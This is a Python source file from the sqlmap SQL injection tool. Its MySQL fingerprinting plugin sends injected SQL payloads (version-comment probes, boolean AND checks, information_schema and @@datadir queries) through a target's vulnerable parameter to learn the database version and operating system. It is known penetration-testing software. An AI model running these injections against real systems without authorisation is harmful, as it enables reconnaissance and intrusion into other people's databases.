#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2007-2010 Bernardo Damele A. G. <bernardo.damele@gmail.com>
Copyright (c) 2006 Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""

import re

from lib.core.agent import agent
from lib.core.common import formatDBMSfp
from lib.core.common import formatFingerprint
from lib.core.common import getHtmlErrorFp
from lib.core.common import randomInt
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.session import setDbms
from lib.core.settings import MYSQL_ALIASES
from lib.request import inject
from lib.request.connect import Connect as Request

from plugins.generic.fingerprint import Fingerprint as GenericFingerprint

class Fingerprint(GenericFingerprint):
    def __init__(self):
        GenericFingerprint.__init__(self)

    def __commentCheck(self):
        infoMsg = "executing MySQL comment injection fingerprint"
        logger.info(infoMsg)

        query   = agent.prefixQuery(" /* NoValue */")
        query   = agent.postfixQuery(query)
        payload = agent.payload(newValue=query)
        result  = Request.queryPage(payload)

        if not result:
            warnMsg = "unable to perform MySQL comment injection"
            logger.warn(warnMsg)

            return None

        # MySQL valid versions updated on 01/2010
        versions = (
                     (32200, 32234),    # MySQL 3.22
                     (32300, 32360),    # MySQL 3.23
                     (40000, 40032),    # MySQL 4.0
                     (40100, 40123),    # MySQL 4.1
                     (50000, 50090),    # MySQL 5.0
                     (50100, 50142),    # MySQL 5.1
                     (50400, 50405),    # MySQL 5.4
                     (50500, 50502),    # MySQL 5.5
                     (60000, 60011),    # MySQL 6.0
                   )

        for element in versions:
            prevVer = None

            for version in range(element[0], element[1] + 1):
                randInt = randomInt()
                version = str(version)
                query   = agent.prefixQuery(" /*!%s AND %d=%d*/" % (version, randInt, randInt + 1))
                query   = agent.postfixQuery(query)
                payload = agent.payload(newValue=query)
                result  = Request.queryPage(payload)

                if result:
                    if not prevVer:
                        prevVer = version

                    if version[0] == "3":
                        midVer = prevVer[1:3]
                    else:
                        midVer = prevVer[2]

                    trueVer = "%s.%s.%s" % (prevVer[0], midVer, prevVer[3:])

                    return trueVer

                prevVer = version

        return None

    def getFingerprint(self):
        value  = ""
        wsOsFp = formatFingerprint("web server", kb.headersFp)

        if wsOsFp:
            value += "%s\n" % wsOsFp

        if kb.data.banner:
            dbmsOsFp = formatFingerprint("back-end DBMS", kb.bannerFp)

            if dbmsOsFp:
                value += "%s\n" % dbmsOsFp

        value  += "back-end DBMS: "
        actVer  = formatDBMSfp()

        if not conf.extensiveFp:
            value += actVer
            return value

        comVer = self.__commentCheck()
        blank  = " " * 15
        value += "active fingerprint: %s" % actVer

        if comVer:
            comVer = formatDBMSfp([comVer])
            value += "\n%scomment injection fingerprint: %s" % (blank, comVer)

        if kb.bannerFp:
            banVer = kb.bannerFp["dbmsVersion"] if 'dbmsVersion' in kb.bannerFp else None

            if re.search("-log$", kb.data.banner):
                banVer += ", logging enabled"

            banVer = formatDBMSfp([banVer])
            value += "\n%sbanner parsing fingerprint: %s" % (blank, banVer)

        htmlErrorFp = getHtmlErrorFp()

        if htmlErrorFp:
            value += "\n%shtml error message fingerprint: %s" % (blank, htmlErrorFp)

        return value

    def checkDbms(self):
        """
        References for fingerprint:

        * http://dev.mysql.com/doc/refman/5.0/en/news-5-0-x.html (up to 5.0.89)
        * http://dev.mysql.com/doc/refman/5.1/en/news-5-1-x.html (up to 5.1.42)
        * http://dev.mysql.com/doc/refman/5.4/en/news-5-4-x.html (up to 5.4.4)
        * http://dev.mysql.com/doc/refman/5.5/en/news-5-5-x.html (up to 5.5.0)
        * http://dev.mysql.com/doc/refman/6.0/en/news-6-0-x.html (manual has been withdrawn)
        """

        infoMsg = "testing MySQL"
        logger.info(infoMsg)

        if conf.direct:
            conf.dbmsConnector.connect()

        if conf.dbms in MYSQL_ALIASES and kb.dbmsVersion and kb.dbmsVersion[0].isdigit():
            setDbms("MySQL %s" % kb.dbmsVersion[0])

            if int(kb.dbmsVersion[0]) >= 5:
                kb.data.has_information_schema = True

            self.getBanner()

            if not conf.extensiveFp:
                return True

        randInt = str(randomInt(1))
        payload = agent.fullPayload(" AND CONNECTION_ID()=CONNECTION_ID()")
        result  = Request.queryPage(payload)

        if result:
            infoMsg = "confirming MySQL"
            logger.info(infoMsg)

            payload = agent.fullPayload(" AND ISNULL(1/0)")
            result  = Request.queryPage(payload)

            if not result:
                warnMsg = "the back-end DMBS is not MySQL"
                logger.warn(warnMsg)

                return False

            # Determine if it is MySQL >= 5.0.0
            if inject.getValue("SELECT %s FROM information_schema.TABLES LIMIT 0, 1" % randInt, charsetType=2) == randInt:
                kb.data.has_information_schema = True
                kb.dbmsVersion = [">= 5.0.0"]

                setDbms("MySQL 5")

                self.getBanner()

                if not conf.extensiveFp:
                    return True

                # Check if it is MySQL >= 5.5.0
                if inject.getValue("SELECT MID(TO_SECONDS(950501), 1, 1)", unpack=False, charsetType=2) == "6":
                    kb.dbmsVersion = [">= 5.5.0"]

                # Check if it is MySQL >= 5.1.2 and < 5.5.0
                elif inject.getValue("SELECT MID(@@table_open_cache, 1, 1)", unpack=False):
                    if inject.getValue("SELECT %s FROM information_schema.GLOBAL_STATUS LIMIT 0, 1" % randInt, unpack=False, charsetType=2) == randInt:
                        kb.dbmsVersion = [">= 5.1.12", "< 5.5.0"]
                    elif inject.getValue("SELECT %s FROM information_schema.PROCESSLIST LIMIT 0, 1" % randInt, unpack=False, charsetType=2) == randInt:
                        kb.dbmsVersion = [">= 5.1.7", "< 5.1.12"]
                    elif inject.getValue("SELECT %s FROM information_schema.PARTITIONS LIMIT 0, 1" % randInt, unpack=False, charsetType=2) == randInt:
                        kb.dbmsVersion = ["= 5.1.6"]
                    elif inject.getValue("SELECT %s FROM information_schema.PLUGINS LIMIT 0, 1" % randInt, unpack=False, charsetType=2) == randInt:
                        kb.dbmsVersion = [">= 5.1.5", "< 5.1.6"]
                    else:
                        kb.dbmsVersion = [">= 5.1.2", "< 5.1.5"]

                # Check if it is MySQL >= 5.0.0 and < 5.1.2
                elif inject.getValue("SELECT MID(@@hostname, 1, 1)", unpack=False):
                    kb.dbmsVersion = [">= 5.0.38", "< 5.1.2"]
                elif inject.getValue("SELECT 1 FROM DUAL", charsetType=1) == "1":
                    kb.dbmsVersion = [">= 5.0.11", "< 5.0.38"]
                elif inject.getValue("SELECT DATABASE() LIKE SCHEMA()"):
                    kb.dbmsVersion = [">= 5.0.2", "< 5.0.11"]
                else:
                    kb.dbmsVersion = [">= 5.0.0", "<= 5.0.1"]

            # Otherwise assume it is MySQL < 5.0.0
            else:
                kb.dbmsVersion = ["< 5.0.0"]

                setDbms("MySQL 4")

                self.getBanner()

                if not conf.extensiveFp:
                    return True

                # Check which version of MySQL < 5.0.0 it is
                coercibility = inject.getValue("SELECT COERCIBILITY(USER())")

                if coercibility == "3":
                    kb.dbmsVersion = [">= 4.1.11", "< 5.0.0"]
                elif coercibility == "2":
                    kb.dbmsVersion = [">= 4.1.1", "< 4.1.11"]
                elif inject.getValue("SELECT CURRENT_USER()"):
                    kb.dbmsVersion = [">= 4.0.6", "< 4.1.1"]

                    if inject.getValue("SELECT CHARSET(CURRENT_USER())") == "utf8":
                        kb.dbmsVersion = ["= 4.1.0"]
                    else:
                        kb.dbmsVersion = [">= 4.0.6", "< 4.1.0"]
                elif inject.getValue("SELECT FOUND_ROWS()", charsetType=1) == "0":
                    kb.dbmsVersion = [">= 4.0.0", "< 4.0.6"]
                elif inject.getValue("SELECT CONNECTION_ID()"):
                    kb.dbmsVersion = [">= 3.23.14", "< 4.0.0"]
                elif re.search("@[\w\.\-\_]+", inject.getValue("SELECT USER()")):
                    kb.dbmsVersion = [">= 3.22.11", "< 3.23.14"]
                else:
                    kb.dbmsVersion = ["< 3.22.11"]

            return True
        else:
            warnMsg = "the back-end DMBS is not MySQL"
            logger.warn(warnMsg)

            return False
        
    def checkDbmsOs(self, detailed=False):
        if kb.os:
            return

        infoMsg = "fingerprinting the back-end DBMS operating system"
        logger.info(infoMsg)

        datadirSubstr = inject.getValue("SELECT MID(@@datadir, 1, 1)", unpack=False)

        if datadirSubstr == "/":
            kb.os = "Linux"
        else:
            kb.os = "Windows"

        infoMsg = "the back-end DBMS operating system is %s" % kb.os
        logger.info(infoMsg)

        self.cleanup(onlyFileTbl=True)
